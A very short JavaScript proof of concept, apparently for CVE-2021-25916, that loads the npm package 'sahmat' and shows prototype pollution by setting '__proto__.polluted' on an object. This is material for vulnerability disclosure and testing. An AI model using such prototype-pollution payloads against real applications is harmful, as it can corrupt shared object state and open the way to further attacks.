//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25916
 
  const sahmat = require("sahmat");
  let obj = { tmp: "" };

   

  sahmat(obj, "tmp", (obj.__proto__.polluted = "yes"));
// End of file
